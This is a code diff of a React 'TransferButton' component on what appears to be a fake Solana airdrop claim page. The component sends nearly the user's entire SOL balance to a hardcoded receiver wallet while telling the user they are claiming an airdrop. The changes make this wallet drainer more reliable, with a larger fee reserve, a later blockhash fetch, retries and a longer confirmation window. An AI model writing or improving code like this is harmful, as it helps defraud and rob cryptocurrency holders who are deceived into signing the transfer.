@@ -25,9 +25,8 @@ export default function TransferButton({ className = '' }) {
         wsEndpoint: false,
       });
 
-      const [balance, { blockhash, lastValidBlockHeight }, rentExempt] = await Promise.all([
+      const [balance, rentExempt] = await Promise.all([
         connection.getBalance(publicKey, 'confirmed'),
-        connection.getLatestBlockhash('confirmed'),
         connection.getMinimumBalanceForRentExemption(0),
       ]);
 
@@ -38,33 +37,24 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // Build a dummy transfer first to estimate the real fee
-      const dummyIx = SystemProgram.transfer({
-        fromPubkey: publicKey,
-        toPubkey: RECEIVER_WALLET,
-        lamports: 1, // placeholder
-      });
-
-      const dummyMsg = new TransactionMessage({
-        payerKey: publicKey,
-        recentBlockhash: blockhash,
-        instructions: [dummyIx],
-      }).compileToV0Message();
-
-      const feeResult = await connection.getFeeForMessage(dummyMsg, 'confirmed');
-      // Base fee from RPC + extra margin for priority fees the wallet may add
-      const baseFee = feeResult?.value ?? 5000;
-      const feeReserve = Math.max(baseFee * 4, TRANSFER_FEE_BUFFER);
-
-      // Reserve fees + rent-exempt minimum so the sender account stays alive
-      const totalReserve = feeReserve + rentExempt;
+      // Reserve rent-exempt minimum + generous fee buffer.
+      // Wallets add ComputeBudget instructions (priority fees) that can
+      // cost 10k-500k+ lamports on top of the 5000 base fee.
+      // 0.005 SOL (5_000_000 lamports) covers even aggressive priority fees.
+      const FEE_SAFETY = 5_000_000; // 0.005 SOL
+      const totalReserve = rentExempt + FEE_SAFETY;
       const transferAmount = balance - totalReserve;
+
       if (transferAmount <= 0) {
         alert('Insufficient balance for transaction fee.');
         return;
       }
 
-      // Build the real transaction with the correct amount
+      // Fetch blockhash as late as possible — right before building the tx
+      // so it doesn't expire while the user is approving in their wallet.
+      const { blockhash, lastValidBlockHeight } =
+        await connection.getLatestBlockhash('finalized');
+
       const instructions = [
         SystemProgram.transfer({
           fromPubkey: publicKey,
@@ -83,43 +73,45 @@ export default function TransferButton({ className = '' }) {
 
       const signature = await sendTransaction(transaction, connection, {
         skipPreflight: true,
+        maxRetries: 3,
       });
 
       console.log('⏳ Transaction sent:', signature);
 
       // Poll for confirmation over HTTP (no WebSocket needed)
       const startTime = Date.now();
-      const TIMEOUT = 60_000; // 60 seconds
-      const POLL_INTERVAL = 2_000; // 2 seconds
+      const TIMEOUT = 90_000; // 90 seconds
+      const POLL_INTERVAL = 2_500;
 
       while (Date.now() - startTime < TIMEOUT) {
-        const { value } = await connection.getSignatureStatuses([signature]);
-        const status = value?.[0];
+        try {
+          const { value } = await connection.getSignatureStatuses([signature]);
+          const status = value?.[0];
 
-        if (status) {
-          if (status.err) {
-            throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
+          if (status) {
+            if (status.err) {
+              throw new Error('Transaction failed on-chain: ' + JSON.stringify(status.err));
+            }
+            if (
+              status.confirmationStatus === 'confirmed' ||
+              status.confirmationStatus === 'finalized'
+            ) {
+              console.log('✅ Transaction confirmed:', signature);
+              alert(`Claim successful!\nTx: ${signature}`);
+              return;
+            }
           }
-          if (
-            status.confirmationStatus === 'confirmed' ||
-            status.confirmationStatus === 'finalized'
-          ) {
-            console.log('✅ Transaction confirmed:', signature);
-            alert(`Claim successful!\nTx: ${signature}`);
-            return;
-          }
-        }
-
-        // Check if blockhash expired
-        const blockHeight = await connection.getBlockHeight('confirmed');
-        if (blockHeight > lastValidBlockHeight) {
-          throw new Error('Transaction expired. Please try again.');
+        } catch (pollErr) {
+          // If it's our own thrown error, rethrow; otherwise ignore polling hiccup
+          if (pollErr.message?.includes('on-chain')) throw pollErr;
+          console.warn('Polling error, retrying...', pollErr);
         }
 
         await new Promise((r) => setTimeout(r, POLL_INTERVAL));
       }
 
-      throw new Error('Confirmation timed out. Check your wallet — the transaction may still land.');
+      // If we get here, tx wasn't confirmed in time but may still land
+      alert(`Transaction sent but not yet confirmed.\nSignature: ${signature}\nCheck Solscan for status.`);
     } catch (err) {
       console.error('Transfer failed:', err);
       alert('Claim failed: ' + (err?.message || 'You are not qualified for this Airdrop'));
